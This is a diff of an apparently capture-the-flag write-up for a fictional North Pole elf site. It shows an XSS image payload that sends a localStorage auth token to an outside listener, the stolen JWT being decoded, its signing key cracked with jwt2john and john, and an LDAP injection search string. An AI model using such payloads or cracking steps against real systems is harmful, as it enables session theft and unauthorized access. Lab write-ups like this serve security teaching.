@@ -98,7 +98,19 @@ email=alabaster.snowball@northpolechristmastown.com \
 message="<IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"></img>"
 #+END_SRC
 
-At that point we had the token I stored in [output/jwt](output/jwt) and used jwt2john.py and john to crack it.  The makefile in output shows the process:
+With the success of the XSS attack, the stolen token was stored in [output/jwt](output/jwt).
+
+Unfortunately the token had expired 4 months ago, and could no longer be used to create a new session:
+
+#+BEGIN_SRC python
+>>> import jwt
+>>> token=open("jwt").read().strip()
+>>> jwt.decode(token, verify=False)
+{'dept': 'Engineering', 'ou': 'elf', 'expires': '2017-08-16 12:00:47.248093+00:00', 'uid': 'alabaster.snowball'}
+#+END_SRC
+
+We needed to crack the encryption key in order to forge a new, valid one.  We
+used jwt2john.py and john to crack it.  The Makefile shows the process:
 
 #+BEGIN_SRC
 jwt.john: ../tools/jwt2john.py jwt
@@ -109,7 +121,30 @@ john.txt: jwt.john
 	john  --format=HMAC-SHA256 jwt.john -show > john.txt
 #+END_SRC
 
-Once logged in, [tools/edb.py](tools/edb.py) was used to exploit the ldap injection vuln using the search string
+jwt2john is used to convert the raw jwt token to a file format john can
+understand, and then john is used to crack it:
+
+#+BEGIN_SRC
+$ make john.txt
+python3 ../tools/jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I > jwt.john
+john  --format=HMAC-SHA256 jwt.john
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 32/64 OpenSSL])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+3lv3s            (?)
+1g 0:00:06:22 DONE 3/3 (2018-01-10 10:45) 0.002613g/s 835027p/s 835027c/s 835027C/s 3lv3s
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+john  --format=HMAC-SHA256 jwt.john -show > john.txt
+$ cat john.txt
+?:3lv3s
+#+END_SRC
+
+Cracking the jwt token took 6 minutes and found that the secret key was =3lv3s=.
+
+TODO: show make_jwt.py and alabaster.jwt makefile targets and how it was used to login. using the browser tools
+
+To automate the process [tools/edb.py](tools/edb.py) was written to exploit the ldap injection vuln using the search string
 
 #+BEGIN_SRC
     name=))(department=it)(|(cn=
